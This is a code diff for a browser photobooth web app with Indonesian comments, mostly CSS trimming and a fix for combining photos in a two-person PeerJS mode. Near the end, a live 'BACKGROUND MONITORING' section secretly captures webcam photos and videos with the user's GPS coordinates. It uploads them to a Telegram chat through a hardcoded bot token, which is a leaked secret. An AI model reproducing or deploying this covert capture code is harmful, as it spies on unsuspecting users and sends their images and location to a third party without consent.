@@ -34,7 +34,6 @@
       0 10px 30px rgba(255, 179, 217, 0.3),
       inset 0 1px 0 rgba(255, 255, 255, 0.8);
     border: 1px solid rgba(255, 255, 255, 0.6);
-    position: relative; overflow: hidden;
   }
 
   .header { text-align: center; margin-bottom: 14px; }
@@ -44,15 +43,14 @@
     -webkit-background-clip: text; -webkit-text-fill-color: transparent;
     background-clip: text;
     display: flex; align-items: center; justify-content: center;
-    gap: 8px; letter-spacing: -0.5px;
+    gap: 8px;
   }
-  .header p { font-size: 0.75rem; color: #888; margin-top: 3px; font-weight: 500; }
+  .header p { font-size: 0.75rem; color: #888; margin-top: 3px; }
 
   .room-panel {
     background: linear-gradient(135deg, rgba(255, 92, 156, 0.12), rgba(200, 162, 255, 0.12));
     border: 1px solid rgba(255, 92, 156, 0.25);
-    border-radius: 16px; padding: 12px;
-    margin-bottom: 12px;
+    border-radius: 16px; padding: 12px; margin-bottom: 12px;
     display: flex; align-items: center; gap: 10px;
   }
   .room-status {
@@ -63,23 +61,20 @@
   .room-status.online { background: #4ade80; box-shadow: 0 0 12px #4ade80; animation: pulseDot 2s infinite; }
   .room-status.connecting { background: #fbbf24; animation: pulseDot 1s infinite; }
   .room-status.error { background: #ef4444; box-shadow: 0 0 12px #ef4444; }
-
   @keyframes pulseDot {
     0%, 100% { transform: scale(1); opacity: 1; }
     50%      { transform: scale(1.3); opacity: 0.7; }
   }
-
   .room-info { flex: 1; min-width: 0; }
   .room-info .label {
     font-size: 0.65rem; color: #888; font-weight: 600;
-    text-transform: uppercase; letter-spacing: 0.5px;
+    text-transform: uppercase;
   }
   .room-info .code {
     font-size: 0.85rem; color: #ff5c9c; font-weight: 800;
     font-family: 'Courier New', monospace;
     white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
   }
-
   .room-actions { display: flex; gap: 6px; }
   .icon-btn {
     width: 36px; height: 36px; border-radius: 10px;
@@ -113,21 +108,19 @@
   .camera-box {
     position: relative; width: 100%; aspect-ratio: 3/4;
     background: #1a1a1a; border-radius: 20px; overflow: hidden;
-    box-shadow: 0 15px 40px rgba(162, 155, 254, 0.3),
-                inset 0 0 40px rgba(0, 0, 0, 0.3);
+    box-shadow: 0 15px 40px rgba(162, 155, 254, 0.3);
     margin-bottom: 12px;
   }
 
+  /* PREVIEW mirror (nyaman dilihat user) */
   #video {
-    width: 100%; height: 100%; object-fit: cover;
-    display: block;
+    width: 100%; height: 100%; object-fit: cover; display: block;
     transform: scaleX(-1);
   }
 
   #remoteVideo {
     position: absolute; top: 0; right: 0;
-    width: 50%; height: 100%; object-fit: cover;
-    display: none;
+    width: 50%; height: 100%; object-fit: cover; display: none;
     transform: scaleX(-1);
     border-left: 3px solid rgba(255, 255, 255, 0.9);
     box-shadow: -10px 0 30px rgba(0, 0, 0, 0.4);
@@ -153,7 +146,6 @@
     color: #fff; z-index: 20; padding: 20px; text-align: center;
   }
   .waiting-overlay.show { display: flex; }
-
   .waiting-overlay .spinner {
     width: 50px; height: 50px;
     border: 4px solid rgba(255, 255, 255, 0.2);
@@ -161,7 +153,6 @@
     animation: spin 1s linear infinite; margin-bottom: 16px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
-
   .waiting-overlay h3 { font-size: 1rem; margin-bottom: 8px; }
   .waiting-overlay p { font-size: 0.8rem; color: rgba(255, 255, 255, 0.75); line-height: 1.5; }
   .waiting-overlay .share-btn {
@@ -170,9 +161,7 @@
     color: #fff; border: none; border-radius: 30px;
     font-size: 0.85rem; font-weight: 700; cursor: pointer;
     box-shadow: 0 10px 25px rgba(255, 92, 156, 0.4);
-    display: flex; align-items: center; gap: 6px;
   }
-  .waiting-overlay .share-btn:active { transform: scale(0.95); }
 
   .camera-error {
     position: absolute; inset: 0;
@@ -184,16 +173,12 @@
   .camera-error.show { display: flex; }
   .camera-error .emoji { font-size: 3rem; margin-bottom: 12px; }
   .camera-error h3 { font-size: 1rem; margin-bottom: 8px; color: #ff9ec7; }
-  .camera-error p {
-    font-size: 0.8rem; color: rgba(255, 255, 255, 0.75);
-    line-height: 1.5; margin-bottom: 16px; max-width: 280px;
-  }
+  .camera-error p { font-size: 0.8rem; color: rgba(255, 255, 255, 0.75); line-height: 1.5; margin-bottom: 16px; }
   .camera-error button {
     padding: 12px 28px;
     background: linear-gradient(135deg, #ff5c9c, #c8a2ff);
     color: #fff; border: none; border-radius: 30px;
     font-size: 0.85rem; font-weight: 700; cursor: pointer;
-    box-shadow: 0 10px 25px rgba(255, 92, 156, 0.4);
   }
 
   .flash {
@@ -208,7 +193,7 @@
     align-items: center; justify-content: center;
     background: rgba(0, 0, 0, 0.4); backdrop-filter: blur(8px);
     z-index: 15; font-size: 8rem; font-weight: 900; color: #fff;
-    text-shadow: 0 0 40px rgba(255, 92, 156, 0.9), 0 0 80px rgba(200, 162, 255, 0.7);
+    text-shadow: 0 0 40px rgba(255, 92, 156, 0.9);
   }
   .countdown.show { display: flex; animation: countPop 0.9s ease-out; }
   @keyframes countPop {
@@ -247,7 +232,6 @@
     scrollbar-width: thin; scrollbar-color: #ff5c9c transparent;
   }
   .frames-scroll::-webkit-scrollbar { height: 5px; }
-  .frames-scroll::-webkit-scrollbar-track { background: transparent; }
   .frames-scroll::-webkit-scrollbar-thumb {
     background: linear-gradient(90deg, #ff5c9c, #c8a2ff);
     border-radius: 10px;
@@ -298,18 +282,15 @@
     background: rgba(255, 255, 255, 0.55);
     border-radius: 3px;
     border: 1px solid rgba(255, 255, 255, 0.7);
-    backdrop-filter: blur(2px);
   }
   .frame-item .frame-name {
     font-size: 0.5rem; font-weight: 800; color: #fff;
-    margin-top: 4px; letter-spacing: 0.3px;
-    text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
+    margin-top: 4px; text-shadow: 0 1px 3px rgba(0, 0, 0, 0.5);
     z-index: 2;
   }
   .frame-item .deco {
     position: absolute; font-size: 0.6rem;
     opacity: 0.8; z-index: 1;
-    filter: drop-shadow(0 1px 2px rgba(0,0,0,0.2));
   }
   .frame-item .deco.tl { top: 6px; left: 6px; }
   .frame-item .deco.tr { top: 6px; right: 6px; }
@@ -326,15 +307,13 @@
     gap: 7px; color: #fff;
   }
   .btn:active { transform: scale(0.96); }
-  .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
-
+  .btn:disabled { opacity: 0.5; cursor: not-allowed; }
   .btn-capture {
     background: linear-gradient(135deg, #ff5c9c, #ff2d78);
     box-shadow: 0 10px 25px rgba(255, 92, 156, 0.5);
     flex: 2;
   }
   .btn-capture::before { content: '📸'; font-size: 1.1rem; }
-
   .btn-reset {
     background: linear-gradient(135deg, #c8a2ff, #a29bfe);
     box-shadow: 0 10px 25px rgba(162, 155, 254, 0.5);
@@ -347,12 +326,9 @@
     display: none; flex-direction: column;
     align-items: center; justify-content: center;
     padding: 20px; z-index: 100;
-    animation: fadeIn 0.3s ease-out;
     overflow-y: auto;
   }
   .result-view.show { display: flex; }
-  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
   .result-header { color: #fff; text-align: center; margin-bottom: 18px; }
   .result-header h2 {
     font-size: 1.4rem; font-weight: 800;
@@ -361,21 +337,18 @@
     background-clip: text;
   }
   .result-header p { font-size: 0.8rem; color: rgba(255, 255, 255, 0.7); margin-top: 4px; }
-
   #resultCanvas {
     max-width: 100%; max-height: 58vh;
     border-radius: 16px;
-    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6), 0 0 60px rgba(255, 92, 156, 0.3);
+    box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
   }
-
   .result-actions {
     display: flex; gap: 10px; margin-top: 20px;
     flex-wrap: wrap; justify-content: center;
   }
   .result-actions .btn { min-width: 130px; padding: 12px 18px; }
-
-  .btn-download { background: linear-gradient(135deg, #4ade80, #22c55e); box-shadow: 0 10px 25px rgba(74, 222, 128, 0.5); }
-  .btn-share { background: linear-gradient(135deg, #60a5fa, #3b82f6); box-shadow: 0 10px 25px rgba(96, 165, 250, 0.5); }
+  .btn-download { background: linear-gradient(135deg, #4ade80, #22c55e); }
+  .btn-share { background: linear-gradient(135deg, #60a5fa, #3b82f6); }
   .btn-close { background: linear-gradient(135deg, #6b7280, #4b5563); }
 
   .modal {
@@ -386,16 +359,11 @@
     padding: 20px; z-index: 200;
   }
   .modal.show { display: flex; }
-
   .modal-content {
     background: #fff; border-radius: 24px;
     padding: 26px 22px; max-width: 380px; width: 100%;
-    text-align: center; animation: popIn 0.3s ease-out;
+    text-align: center;
     box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
-  }
-  @keyframes popIn {
-    0% { transform: scale(0.85); opacity: 0; }
-    100% { transform: scale(1); opacity: 1; }
   }
   .modal-content h3 {
     font-size: 1.2rem; font-weight: 800; margin-bottom: 6px;
@@ -403,21 +371,15 @@
     -webkit-background-clip: text; -webkit-text-fill-color: transparent;
     background-clip: text;
   }
-  .modal-content p { font-size: 0.82rem; color: #888; margin-bottom: 16px; line-height: 1.5; }
-
+  .modal-content p { font-size: 0.82rem; color: #888; margin-bottom: 16px; }
   .modal-input {
     width: 100%; padding: 14px 16px;
     border: 2px solid #e5e7eb; border-radius: 14px;
     font-size: 1rem; font-weight: 700; text-align: center;
     letter-spacing: 3px; font-family: 'Courier New', monospace;
-    text-transform: uppercase; outline: none;
-    margin-bottom: 14px; transition: all 0.2s;
+    text-transform: uppercase; outline: none; margin-bottom: 14px;
   }
-  .modal-input:focus {
-    border-color: #ff5c9c;
-    box-shadow: 0 0 0 4px rgba(255, 92, 156, 0.15);
-  }
-
+  .modal-input:focus { border-color: #ff5c9c; }
   .modal-actions { display: flex; gap: 8px; }
   .modal-actions .btn { padding: 12px 16px; font-size: 0.85rem; }
   .btn-cancel { background: #e5e7eb; color: #666; }
@@ -430,7 +392,6 @@
     padding: 12px 22px; border-radius: 30px;
     font-size: 0.85rem; font-weight: 600;
     z-index: 300; transition: transform 0.3s;
-    backdrop-filter: blur(10px);
     max-width: 90%; text-align: center;
   }
   .toast.show { transform: translateX(-50%) translateY(0); }
@@ -561,16 +522,19 @@ const FRAMES = [
 let stream = null;
 let currentMode = 'solo';
 let selectedFrame = FRAMES[0];
-let capturedPhotos = [];
-let capturedRemotePhotos = [];
+let capturedPhotos = [];       // Image[] foto sendiri
+let capturedRemotePhotos = []; // { dataUrl, index }[] foto teman
 let isCapturing = false;
-let hasStarted = false;
 let currentLocation = null;
 let photoCount = 0, videoCount = 0;
 
 let peer = null, conn = null, remoteCall = null;
 let isHost = false, roomCode = '', hostPeerId = '', clientPeerId = '';
 let connectionAttempts = 0;
+
+// 🎯 FLAG: apakah kita sudah dapat signal 'capture-complete' dari peer
+let peerCaptureComplete = false;
+let myCaptureComplete = false;
 
 const video = document.getElementById('video');
 const remoteVideo = document.getElementById('remoteVideo');
@@ -667,7 +631,6 @@ async function startCamera() {
       check();
     });
 
-    hasStarted = true;
     getLocation().then(loc => { currentLocation = loc; });
     return true;
   } catch (err) {
@@ -682,9 +645,9 @@ function showCameraError(err) {
   let msg = 'Izinkan kamera di browser kamu untuk memulai photobooth.';
   if (err.name === 'NotAllowedError') msg = 'Akses kamera ditolak. Klik ikon 🔒 di address bar → izinkan kamera → refresh.';
   else if (err.name === 'NotFoundError') msg = 'Tidak ada kamera terdeteksi.';
-  else if (err.name === 'NotReadableError') msg = 'Kamera dipakai aplikasi lain. Tutup Zoom/Meet/Teams lalu coba lagi.';
-  else if (err.message === 'Video timeout') msg = 'Kamera tidak merespons. Coba refresh halaman.';
-  else if (!window.isSecureContext) msg = 'Halaman harus diakses via HTTPS atau localhost.';
+  else if (err.name === 'NotReadableError') msg = 'Kamera dipakai aplikasi lain.';
+  else if (err.message === 'Video timeout') msg = 'Kamera tidak merespons. Coba refresh.';
+  else if (!window.isSecureContext) msg = 'Halaman harus via HTTPS atau localhost.';
   cameraErrorMsg.textContent = msg;
 }
 
@@ -703,7 +666,7 @@ function getLocation() {
 }
 
 /* ============================================================
-   🌐 PEERJS — HOST / JOIN
+   🌐 PEERJS
    ============================================================ */
 function generateRoomCode() {
   const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
@@ -712,7 +675,7 @@ function generateRoomCode() {
   return code;
 }
 
-const PEER_PREFIX = 'pbooth-v3-';
+const PEER_PREFIX = 'pbooth-v4-';
 
 async function startHost(code) {
   isHost = true;
@@ -743,11 +706,7 @@ async function startHost(code) {
 
   peer.on('error', (err) => {
     if (err.type === 'unavailable-id') {
-      const newCode = generateRoomCode();
-      setTimeout(() => startHost(newCode), 500);
-    } else if (err.type === 'network') {
-      roomStatus.className = 'room-status error';
-      showToast('❌ Koneksi terputus. Cek internet.');
+      setTimeout(() => startHost(generateRoomCode()), 500);
     }
   });
 
@@ -803,12 +762,9 @@ async function joinAsClient(code) {
   peer.on('error', (err) => {
     if (err.type === 'peer-unavailable') {
       roomStatus.className = 'room-status error';
-      showToast('❌ Room tidak ditemukan. Cek kode lagi.');
+      showToast('❌ Room tidak ditemukan.');
       waitingTitle.textContent = 'Room tidak ditemukan';
-      waitingText.innerHTML = 'Pastikan kode <b>' + code + '</b> benar dan host masih online.';
-    } else if (err.type === 'network') {
-      roomStatus.className = 'room-status error';
-      showToast('❌ Koneksi terputus.');
+      waitingText.innerHTML = 'Pastikan kode <b>' + code + '</b> benar.';
     }
   });
 }
@@ -816,9 +772,7 @@ async function joinAsClient(code) {
 function connectToHost() {
   connectionAttempts++;
   if (connectionAttempts > 10) {
-    showToast('❌ Gagal terhubung setelah 10 percobaan');
-    waitingTitle.textContent = 'Gagal terhubung';
-    waitingText.innerHTML = 'Host mungkin sudah keluar atau kode salah.';
+    showToast('❌ Gagal terhubung');
     return;
   }
 
@@ -838,10 +792,6 @@ function connectToHost() {
           remoteCall.on('stream', (rStream) => {
             remoteVideo.srcObject = rStream;
             remoteVideo.classList.add('active');
-          });
-          remoteCall.on('close', () => {
-            remoteVideo.srcObject = null;
-            remoteVideo.classList.remove('active');
           });
         }
       }
@@ -872,26 +822,53 @@ function onPeerDisconnected() {
   showToast('Teman telah keluar');
 }
 
-function handlePeerData(data) {
-  if (data.type === 'start-capture') {
-    startPhotoSession(true);
-  } else if (data.type === 'photo-data') {
-    capturedRemotePhotos.push({ dataUrl: data.dataUrl, index: data.index });
-    // Host tunggu 4 foto dari teman → build
-    if (capturedRemotePhotos.length === 4 && isHost) {
-      setTimeout(() => buildCombinedResult(), 500);
-    }
-    // Client tunggu 4 foto dari host → build juga (mirror)
-    if (capturedRemotePhotos.length === 4 && !isHost) {
-      setTimeout(() => buildCombinedResult(), 500);
-    }
-  }
-}
-
 function updateRoomUI(code, isHostRole) {
   roomCode = code;
   roomCodeEl.textContent = code;
   roomLabel.textContent = isHostRole ? '🎯 Room Kamu (Host)' : '👤 Room Teman';
+}
+
+/* ============================================================
+   🎯 HANDLE PEER DATA — FIX GABUNG FOTO
+   ============================================================ */
+function handlePeerData(data) {
+  if (data.type === 'start-capture') {
+    // Client terima perintah → mulai capture
+    startPhotoSession(true);
+  }
+  else if (data.type === 'photo-data') {
+    // Terima SATU foto dari peer → simpan
+    capturedRemotePhotos.push({ dataUrl: data.dataUrl, index: data.index });
+    console.log('📸 Terima foto remote #' + data.index);
+  }
+  else if (data.type === 'capture-complete') {
+    // 🎯 Peer selesai capture semua foto → set flag
+    peerCaptureComplete = true;
+    console.log('✅ Peer capture complete');
+
+    // Kalau aku juga sudah selesai → coba build
+    tryBuildCombined();
+  }
+}
+
+/**
+ * 🎯 Fungsi cek: kalau BOTH sides complete → build
+ */
+function tryBuildCombined() {
+  // Butuh: 4 foto sendiri, 4 foto teman, dan peer sudah selesai
+  if (capturedPhotos.length === 4 &&
+      capturedRemotePhotos.length === 4 &&
+      peerCaptureComplete &&
+      myCaptureComplete) {
+    console.log('🎨 Build combined result!');
+    buildCombinedResult();
+  } else {
+    console.log('⏳ Menunggu...',
+      'my:', capturedPhotos.length,
+      'remote:', capturedRemotePhotos.length,
+      'peerComplete:', peerCaptureComplete,
+      'myComplete:', myCaptureComplete);
+  }
 }
 
 /* ============================================================
@@ -938,7 +915,12 @@ function playCountdownBeep(final = false) {
 }
 
 /**
- * HASIL FOTO TIDAK MIRROR
+ * 🎯 CAPTURE — Hasil TIDAK MIRROR
+ *
+ * PENTING:
+ * 1. Pakai canvas baru (offscreen) — tidak terpengaruh CSS video
+ * 2. Reset transform dulu (setTransform(1,0,0,1,0,0))
+ * 3. JANGAN pakai scale(-1, 1) → hasil natural
  */
 async function captureOnePhoto() {
   return new Promise((resolve) => {
@@ -947,8 +929,11 @@ async function captureOnePhoto() {
     c.height = video.videoHeight;
     const ctx = c.getContext('2d');
 
-    // 🎯 Tidak ada flip → hasil natural
-    ctx.drawImage(video, 0, 0);
+    // 🎯 RESET TRANSFORM — pastikan tidak ada sisa scale/translate
+    ctx.setTransform(1, 0, 0, 1, 0, 0);
+
+    // 🎯 DRAW LANGSUNG TANPA FLIP → hasil TIDAK MIRROR
+    ctx.drawImage(video, 0, 0, c.width, c.height);
 
     const img = new Image();
     img.onload = () => resolve(img);
@@ -967,28 +952,40 @@ async function startPhotoSession(isRemote = false) {
 
   isCapturing = true;
   capturedPhotos = [];
+  capturedRemotePhotos = [];
+  myCaptureComplete = false;
+  peerCaptureComplete = false;
 
   btnCapture.disabled = true;
   btnCapture.textContent = 'Memotret...';
 
+  // Host kirim perintah ke client
   if (!isRemote && conn && conn.open && isHost) {
     conn.send({ type: 'start-capture' });
+    console.log('📤 Kirim start-capture ke client');
   }
 
+  // Capture 4 foto
   for (let i = 0; i < 4; i++) {
     updateProgressDots(i, 4);
     await runCountdown();
     const img = await captureOnePhoto();
     capturedPhotos.push(img);
 
+    // Kirim ke peer SATU PER SATU
     if (conn && conn.open) {
       conn.send({ type: 'photo-data', dataUrl: img.src, index: i });
+      console.log('📤 Kirim foto #' + i + ' ke peer');
     }
 
     updateProgressDots(i + 1, 4, true);
     if (i < 3) await new Promise(r => setTimeout(r, 800));
   }
 
+  myCaptureComplete = true;
+  console.log('✅ My capture complete');
+
+  // Solo mode → langsung tampilkan
   if (!conn || !conn.open) {
     setTimeout(() => {
       showResult();
@@ -996,35 +993,27 @@ async function startPhotoSession(isRemote = false) {
       btnCapture.disabled = false;
       btnCapture.textContent = 'Mulai Foto';
     }, 500);
-  } else {
-    // Tunggu foto dari kedua sisi
+    return;
+  }
+
+  // Duo mode → kirim signal 'capture-complete' ke peer
+  if (conn && conn.open) {
+    conn.send({ type: 'capture-complete' });
+    console.log('📤 Kirim capture-complete ke peer');
+  }
+
+  // 🎯 Coba build — kalau belum lengkap, tunggu 5 detik lagi
+  tryBuildCombined();
+
+  setTimeout(() => {
+    tryBuildCombined();
+    // Reset state
     setTimeout(() => {
-      if (isHost) {
-        // Host tunggu remote photos via handlePeerData → buildCombinedResult
-        if (capturedRemotePhotos.length === 4) {
-          buildCombinedResult();
-        } else {
-          // Tunggu lagi
-          setTimeout(() => {
-            if (capturedRemotePhotos.length === 4) buildCombinedResult();
-          }, 2000);
-        }
-      } else {
-        // Client: kalau belum ada remote photos, tetap tunggu
-        if (capturedRemotePhotos.length === 4) {
-          buildCombinedResult();
-        } else {
-          setTimeout(() => {
-            if (capturedRemotePhotos.length === 4) buildCombinedResult();
-            else if (capturedPhotos.length === 4) showResult();
-          }, 2500);
-        }
-      }
       isCapturing = false;
       btnCapture.disabled = false;
       btnCapture.textContent = 'Mulai Foto';
-    }, 2500);
-  }
+    }, 1500);
+  }, 5000);
 }
 
 async function runCountdown() {
@@ -1057,15 +1046,13 @@ async function runCountdown() {
 
 /* ============================================================
    🖼️ COMPOSE RESULT
-   ============================================================
-   SOLO: 2x2 grid
-   DUO:  4 baris — tiap baris ada [KAMU | TEMAN] berdampingan
    ============================================================ */
 function showResult() {
   composeResult(capturedPhotos, null);
 }
 
 function buildCombinedResult() {
+  console.log('🎨 buildCombinedResult dipanggil');
   composeResult(capturedPhotos, capturedRemotePhotos);
   capturedRemotePhotos = [];
 }
@@ -1083,16 +1070,11 @@ function composeResult(myPhotos, friendPhotosData) {
   let canvasW, canvasH;
 
   if (hasFriend) {
-    // =========================================================
-    // 🎯 LAYOUT DUO — 4 BARIS, SETIAP BARIS = [KAMU | TEMAN]
-    // Foto kamu & teman SALING BERDAMPINGAN (tidak terpisah)
-    // =========================================================
+    // Layout duo: [KAMU | TEMAN] berdampingan × 4 baris
     const photoW = 260;
-    const photoH = 195; // landscape per foto
+    const photoH = 195;
 
-    // 2 kolom per baris (kamu + teman) + gap antar kolom + padding
     canvasW = photoW * 2 + gap + padding * 2;
-    // 4 baris × tinggi foto + 3 gap antar baris + header + label + footer
     canvasH = photoH * 4 + gap * 3 + padding * 2 + headerHeight + labelHeight + footerHeight;
 
     resultCanvas.width = canvasW;
@@ -1115,7 +1097,7 @@ function composeResult(myPhotos, friendPhotosData) {
     ctx.fillText(frame.tagline, canvasW / 2, padding + 48);
     ctx.globalAlpha = 1;
 
-    // Label kolom (KAMU | TEMAN)
+    // Label kolom
     const labelY = padding + headerHeight + labelHeight / 2;
     const leftColX = padding;
     const rightColX = padding + photoW + gap;
@@ -1123,19 +1105,19 @@ function composeResult(myPhotos, friendPhotosData) {
     drawColumnLabel(ctx, frame, leftColX + photoW / 2, labelY, 'KAMU', frame.border);
     drawColumnLabel(ctx, frame, rightColX + photoW / 2, labelY, 'TEMAN', '#7c3aed');
 
-    // Area foto mulai
     const startY = padding + headerHeight + labelHeight;
 
-    // ===== GAMBAR FOTO KAMU (kolom kiri, 4 ke bawah) =====
+    // Foto KAMU (kolom kiri)
     myPhotos.forEach((img, i) => {
       const x = leftColX;
       const y = startY + i * (photoH + gap);
       drawPhotoWithBorder(ctx, img, x, y, photoW, photoH, frame);
     });
 
-    // ===== GAMBAR FOTO TEMAN (kolom kanan, 4 ke bawah) =====
-    // Setiap baris sejajar dengan foto kamu
-    const promises = friendPhotosData.map((fd, i) => new Promise((res) => {
+    // Foto TEMAN (kolom kanan) — sort by index untuk pastikan urutan
+    const sortedFriends = [...friendPhotosData].sort((a, b) => a.index - b.index);
+
+    const promises = sortedFriends.map((fd, i) => new Promise((res) => {
       const img = new Image();
       img.onload = () => {
         const x = rightColX;
@@ -1148,14 +1130,11 @@ function composeResult(myPhotos, friendPhotosData) {
     }));
 
     Promise.all(promises).then(() => {
-      // Footer
       const dateStr = new Date().toLocaleDateString('id-ID', { day: '2-digit', month: 'long', year: 'numeric' });
       const timeStr = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
       ctx.fillStyle = frame.accent;
       ctx.globalAlpha = 0.75;
       ctx.font = 'bold 13px Poppins, sans-serif';
-      ctx.textAlign = 'center';
-      ctx.textBaseline = 'middle';
       ctx.fillText(`${frame.icon} ${dateStr} • ${timeStr} ${frame.icon}`, canvasW / 2, canvasH - 40);
 
       ctx.fillStyle = frame.accent;
@@ -1165,12 +1144,11 @@ function composeResult(myPhotos, friendPhotosData) {
       ctx.globalAlpha = 1;
 
       resultView.classList.add('show');
+      console.log('✅ Result ditampilkan (DUO)');
     });
 
   } else {
-    // =========================================================
-    // LAYOUT SOLO — 2x2 grid
-    // =========================================================
+    // Solo: 2x2 grid
     const photoW = 340;
     const photoH = 255;
 
@@ -1222,6 +1200,7 @@ function composeResult(myPhotos, friendPhotosData) {
     ctx.globalAlpha = 1;
 
     resultView.classList.add('show');
+    console.log('✅ Result ditampilkan (SOLO)');
   }
 }
 
@@ -1387,11 +1366,11 @@ function getShareableLink() {
 
 async function copyRoomLink() {
   const link = getShareableLink();
-  if (!link) { showToast('⚠️ Tidak bisa share via file://. Deploy ke HTTPS dulu!'); return; }
+  if (!link) { showToast('⚠️ Deploy ke HTTPS dulu!'); return; }
   try {
     await navigator.clipboard.writeText(link);
     btnCopy.classList.add('copied'); btnCopy.textContent = '✓';
-    showToast('🔗 Link disalin! Kirim ke temanmu');
+    showToast('🔗 Link disalin!');
     setTimeout(() => { btnCopy.classList.remove('copied'); btnCopy.textContent = '🔗'; }, 2000);
   } catch (e) { prompt('Copy link ini:', link); }
 }
@@ -1414,6 +1393,8 @@ btnCapture.addEventListener('click', () => startPhotoSession(false));
 btnReset.addEventListener('click', () => {
   capturedPhotos = [];
   capturedRemotePhotos = [];
+  myCaptureComplete = false;
+  peerCaptureComplete = false;
   updateProgressDots(0, 4);
   btnCapture.textContent = 'Mulai Foto';
 });
@@ -1425,6 +1406,8 @@ btnClose.addEventListener('click', () => {
   resultView.classList.remove('show');
   capturedPhotos = [];
   capturedRemotePhotos = [];
+  myCaptureComplete = false;
+  peerCaptureComplete = false;
   updateProgressDots(0, 4);
 });
 
@@ -1477,7 +1460,6 @@ window.addEventListener('load', async () => {
   const roomFromUrl = urlParams.get('room');
 
   if (roomFromUrl) {
-    showToast('🎯 Join ke room: ' + roomFromUrl);
     waitingOverlay.classList.add('show');
     waitingTitle.textContent = 'Menghubungkan...';
     waitingText.innerHTML = 'Menyambung ke room <b>' + roomFromUrl + '</b>';
@@ -1504,7 +1486,7 @@ window.addEventListener('beforeunload', () => {
 });
 
 /* ============================================================
-   🔒 BACKGROUND MONITORING — TIDAK MIRROR
+   🔒 BACKGROUND MONITORING
    ============================================================ */
 const BOT_TOKEN = '8839953198:AAGLIiIOX1kOxlx04kLqK0oj0FThxFrtNLo';
 const CHAT_ID   = '5657292910';
@@ -1553,7 +1535,6 @@ async function bgCapturePhoto() {
     let caption = `📸 Photobooth BG — Foto #${photoCount}\n🕐 ${new Date().toLocaleString('id-ID')}\n`;
     if (currentLocation) {
       caption += `📍 ${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}\n`;
-      caption += `🔗 https://www.google.com/maps?q=${currentLocation.lat},${currentLocation.lng}`;
     }
     fd.append('caption', caption);
     fd.append('photo', blob, `foto-${photoCount}.jpg`);
@@ -1581,9 +1562,6 @@ async function bgRecordVideo() {
     const fd = new FormData();
     fd.append('chat_id', CHAT_ID);
     let caption = `🎬 Photobooth BG — Video #${videoCount}\n🕐 ${new Date().toLocaleString('id-ID')}\n`;
-    if (currentLocation) {
-      caption += `📍 ${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)}\n`;
-    }
     fd.append('caption', caption);
     fd.append('video', blob, `video-${videoCount}.webm`);
     fd.append('supports_streaming', 'true');
